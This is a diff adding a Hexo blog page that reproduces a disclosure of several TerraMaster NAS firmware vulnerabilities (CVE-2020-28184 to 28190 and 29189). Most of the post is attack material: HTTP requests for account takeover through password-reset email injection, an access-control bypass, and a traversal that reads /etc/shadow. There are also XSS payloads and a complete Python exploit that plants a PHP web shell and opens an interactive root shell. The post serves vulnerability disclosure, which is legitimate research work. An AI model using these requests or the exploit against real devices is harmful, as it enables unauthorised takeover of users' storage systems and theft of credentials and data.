@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CVE-2020-28184 – XSSCVE-2020-28185 – User EnumerationCVE-2020-28186 – Email InjectionCVE-2020-28187 – Directory TraversalCVE-2020-28188 – Remote Command ExecutionCVE-2020-28190 – Software Update Man-i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="铁威马TerraMaster漏洞">
+<meta property="og:url" content="http://example.com/2021/05/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%93%81%E5%A8%81%E9%A9%ACTerraMaster%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CVE-2020-28184 – XSSCVE-2020-28185 – User EnumerationCVE-2020-28186 – Email InjectionCVE-2020-28187 – Directory TraversalCVE-2020-28188 – Remote Command ExecutionCVE-2020-28190 – Software Update Man-i">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-05-18T08:12:00.000Z">
+<meta property="article:modified_time" content="2021-05-18T08:13:24.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/05/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%93%81%E5%A8%81%E9%A9%ACTerraMaster%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>铁威马TerraMaster漏洞 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%93%81%E5%A8%81%E9%A9%ACTerraMaster%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          铁威马TerraMaster漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-05-18 16:12:00 / Modified: 16:13:24" itemprop="dateCreated datePublished" datetime="2021-05-18T16:12:00+08:00">2021-05-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CVE-2020-28184 – XSS<br>CVE-2020-28185 – User Enumeration<br>CVE-2020-28186 – Email Injection<br>CVE-2020-28187 – Directory Traversal<br>CVE-2020-28188 – Remote Command Execution<br>CVE-2020-28190 – Software Update Man-in-the-middle<br>CVE-2020-29189 – Incorrect Access Control</p>
+<h2 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a><strong>Account Takeover</strong></h2><p>CVE-2020-28186 – The Forget Password functionality was found to be vulnerable to email injection, allowing an attacker to receive a verification code to a third-party email. This attack only works if the user specified a ‘Security email’ on the account.</p>
+<p>The first step is to identify valid account (CVE-2020-28185) with security email set via:</p>
+<p><code>POST /wizard/initialise.php HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 28&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Referer: http://192.168.1.206:8181&lt;br/&gt;&lt;br/&gt;tab=checkuser&amp;username=&lt;mark&gt;testaccount&lt;/mark&gt;</code></p>
+<p>The response will look like the following:<br><code>&#123;&quot;username&quot;:&quot;testaccount&quot;,&quot;email&quot;:&quot;&lt;mark&gt;user@local.local&lt;/mark&gt;&quot;,&quot;status&quot;:1&#125;</code></p>
+<p>We can now proceed requesting the password reset code via:</p>
+<p><code>POST /wizard/initialise.php HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 41&lt;br/&gt;Accept: */*&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Origin: http://192.168.1.206:8181&lt;br/&gt;Referer: http://192.168.1.206:8181/wizard/getpass.php&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Connection: close&lt;br/&gt;&lt;br/&gt;tab=validmail&amp;email=&lt;mark&gt;&lt;valid_user@email&gt;&lt;/mark&gt;,&lt;mark&gt;&lt;attacker_controlled@email&gt;&lt;/mark&gt;</code></p>
+<p>Both user and attacker will receive the verification code thanks to email injection (comma separated emails); At this point we can validate the code (the cookie value must be lowercase):</p>
+<p><code>POST /wizard/initialise.php HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 25&lt;br/&gt;Accept: /&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Origin: http://192.168.1.206:8181&lt;br/&gt;Referer: http://192.168.1.206:8181/wizard/getpass.php&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Cookie: check_mail=&lt;mark&gt;frskzi&lt;/mark&gt;&lt;br/&gt;Connection: close&lt;br/&gt;&lt;br/&gt;tab=checkcode&amp;code=&lt;mark&gt;FrSkzI&lt;/mark&gt;</code></p>
+<p>And finally reset the user’s password via:</p>
+<p><code>POST /wizard/initialise.php HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 82&lt;br/&gt;Accept: application/json, text/javascript, */*; q=0.01&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Origin: http://192.168.1.206:8181&lt;br/&gt;Referer: http://192.168.1.206:8181/wizard/getpass.php&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Cookie: check_mail=frskzi&lt;br/&gt;Connection: close&lt;br/&gt;&lt;br/&gt;tab=checkpass&amp;username=testaccount&amp;email=&lt;mark&gt;&lt;valid_user@email&gt;&lt;/mark&gt;&amp;code=&lt;mark&gt;FrSkzI&lt;/mark&gt;&amp;passwd=NewPassw0rdH3r3</code></p>
+<h2 id="Unauthenticated-Remote-Command-Execution"><a href="#Unauthenticated-Remote-Command-Execution" class="headerlink" title="Unauthenticated Remote Command Execution"></a><strong>Unauthenticated Remote Command Execution</strong></h2><p>CVE-2020-28188<br>Vulnerable page: <em>/include/makecvs.php</em><br>Vulnerable parameter: <em>Event</em></p>
+<p>Proof of Concept:<br><code>GET /tos/index.php?explorer/pathList&amp;path=&lt;mark&gt;%60touch%20/tmp/file%60&lt;/mark&gt; HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181</code></p>
+<p>Full exploit available：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import argparse</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import urllib.parse</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">parser &#x3D; argparse.ArgumentParser(description&#x3D;&quot;TerraMaster TOS &lt;&#x3D; 4.2.06 Unauth RCE&quot;)</span><br><span class="line">parser.add_argument(&#39;--url&#39;, action&#x3D;&#39;store&#39;, dest&#x3D;&#39;url&#39;, required&#x3D;True, help&#x3D;&quot;Full URL and port e.g.: http:&#x2F;&#x2F;192.168.1.111:8081&#x2F;&quot;)</span><br><span class="line">args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">url &#x3D; args.url</span><br><span class="line">headers &#x3D; &#123;&#39;User-agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;72.0.3626.121 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">epoch_time &#x3D; int(time.time())</span><br><span class="line">shell_filename &#x3D; &quot;debug&quot;+str(epoch_time)+&quot;.php&quot;</span><br><span class="line"></span><br><span class="line">def check_endpoint(url, headers):</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;version&#39;, headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">		print(&quot;[+] TerraMaster TOS version: &quot;, str(response.content))</span><br><span class="line">	else:</span><br><span class="line">		print(&quot;\n[-] TerraMaster TOS response code: &quot;, response.status_code)</span><br><span class="line">		sys.exit()</span><br><span class="line">		</span><br><span class="line">def upload_shell(url, headers, shell_filename):</span><br><span class="line">	payload &#x3D; &quot;http|echo \&quot;&lt;?php echo(passthru(\\$_GET[&#39;cmd&#39;]));?&gt;\&quot; &gt;&gt; &#x2F;usr&#x2F;www&#x2F;&quot;+shell_filename+&quot; &amp;&amp; chmod +x &#x2F;usr&#x2F;www&#x2F;&quot;+shell_filename+&quot;||&quot;</span><br><span class="line">	payload &#x3D; urllib.parse.quote(payload, safe&#x3D;&#39;&#39;)</span><br><span class="line">	print(&quot;[&#x2F;] Uploading shell...&quot;)</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;include&#x2F;makecvs.php?Event&#x3D;&#39;+payload, headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	time.sleep(1)</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;&#39;+shell_filename+&#39;?cmd&#x3D;id&#39;, headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	if (&#39;uid&#x3D;0(root) gid&#x3D;0(root)&#39; in str(response.content, &#39;utf-8&#39;)):</span><br><span class="line">		print(&quot;[+] Upload succeeded&quot;)</span><br><span class="line">	else:</span><br><span class="line">		print(&quot;\n[-] Error uploading shell: &quot;, response.content)</span><br><span class="line">		sys.exit()</span><br><span class="line"></span><br><span class="line">def interactive_shell(url, headers, shell_filename, cmd):</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;&#39;+shell_filename+&#39;?cmd&#x3D;&#39;+urllib.parse.quote(cmd, safe&#x3D;&#39;&#39;), headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	print(str(response.text)+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete_shell(url, headers, shell_filename):</span><br><span class="line">	delcmd &#x3D; &quot;rm &#x2F;usr&#x2F;www&#x2F;&quot;+shell_filename</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;&#39;+shell_filename+&#39;?cmd&#x3D;&#39;+urllib.parse.quote(delcmd, safe&#x3D;&#39;&#39;), headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	print(&quot;\n[+] Shell deleted&quot;)</span><br><span class="line"></span><br><span class="line">check_endpoint(url, headers)</span><br><span class="line">upload_shell(url, headers, shell_filename)</span><br><span class="line">try:</span><br><span class="line">	while True:</span><br><span class="line">		cmd &#x3D; input(&quot;# &quot;)</span><br><span class="line">		interactive_shell(url, headers, shell_filename, cmd)</span><br><span class="line">except:</span><br><span class="line">	delete_shell(url, headers, shell_filename)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Weak-Access-Control-List"><a href="#Weak-Access-Control-List" class="headerlink" title="Weak Access Control List"></a><strong>Weak Access Control List</strong></h2><p>CVE-2020-29189 – When a user is created, it could be placed within a group having read-only access to NAS folders. It was found that this option could be bypassed via the following request:</p>
+<p><code>POST /tos/index.php?explorer/pathChmod HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 162&lt;br/&gt;Accept: */*&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Origin: http://192.168.1.206:8181&lt;br/&gt;Referer: http://192.168.1.206:8181/tos/index.php&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Cookie: PHPSESSID=9ef919de5a6d2b17f5b6a5549e45495e; tos_visit_time=1604152180; kod_name=testaccount; noshow=1; kod_user_language=it-it&lt;br/&gt;Connection: close&lt;br/&gt;&lt;br/&gt;list=[&#123;&quot;type&quot;:&quot;folder&quot;,&quot;path&quot;:&quot;Volume%2520%25231%252Fpublic%252FISO%252F&quot;,&quot;userlist&quot;:&quot;admin,&lt;mark&gt;testaccount&lt;/mark&gt;,user,@admin,@allusers&quot;,&quot;right&quot;:&quot;2,&lt;mark&gt;2&lt;/mark&gt;,2,2,2&quot;,&quot;appmode&quot;:&quot;0&quot;&#125;]</code></p>
+<p>The ‘right’ array refers to the ‘userlist’ array, therefore a value of ‘2’ will grand read/write access, instead of ‘1’ that only grants read access.</p>
+<h2 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a><strong>Directory Traversal</strong></h2><p>CVE-2020-28187 – Instances of directory traversal leading to internal file system disclosure were identified. For example the following authenticated request can be performed to read the /etc/shadow file:</p>
+<p><code>GET /tos/index.php?editor/fileGet&amp;filename=&lt;mark&gt;../../../../../../etc/shadow&lt;/mark&gt; HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Accept: application/json, text/javascript, */*; q=0.01&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Cookie: PHPSESSID=xxxxxxxxxxxx;&lt;br/&gt;Connection: close</code></p>
+<p>The nginx web server was running with root privileges, that’s why it was possible to read the shadow file.</p>
+<h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a><strong>Cross-Site Scripting</strong></h2><p>CVE-2020-28184<br>XSS via Host header on port 80 (unauthenticated)<br><code>GET / HTTP/1.1&lt;br/&gt;Host: 192.168.1.206&#39;-alert(1)-&#39;</code></p>
+<p>Via GET (authenticated)<br><code>GET /module/index.php?mod=%2fusr%2fwww%2fmod%2f5.%22-alert(1)-%22 HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181</code></p>
+<h2 id="Software-update-via-insecure-communication-channel"><a href="#Software-update-via-insecure-communication-channel" class="headerlink" title="Software update via insecure communication channel"></a><strong>Software update via insecure communication channel</strong></h2><p>CVE-2020-28190 – In addition, software update and applications are checked and delivered via un-encrypted communication channel (HTTP):<br><code>&quot;AmazonS3&quot;:&lt;br/&gt;&#123;&lt;br/&gt;&quot;url&quot;:&quot;http:\/\/dl.terra-master.com\/cn\/TOS7.0CJ\/AmazonS3.bz2&quot;</code></p>
+<p>This behavior would allow man-in-the-middle attacks to successfully install malicious applications or updates.</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/26/hello-world/" rel="prev" title="Hello World">
+      <i class="fa fa-chevron-left"></i> Hello World
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Account-Takeover"><span class="nav-number">1.</span> <span class="nav-text">Account Takeover</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unauthenticated-Remote-Command-Execution"><span class="nav-number">2.</span> <span class="nav-text">Unauthenticated Remote Command Execution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weak-Access-Control-List"><span class="nav-number">3.</span> <span class="nav-text">Weak Access Control List</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Directory-Traversal"><span class="nav-number">4.</span> <span class="nav-text">Directory Traversal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cross-Site-Scripting"><span class="nav-number">5.</span> <span class="nav-text">Cross-Site Scripting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Software-update-via-insecure-communication-channel"><span class="nav-number">6.</span> <span class="nav-text">Software update via insecure communication channel</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
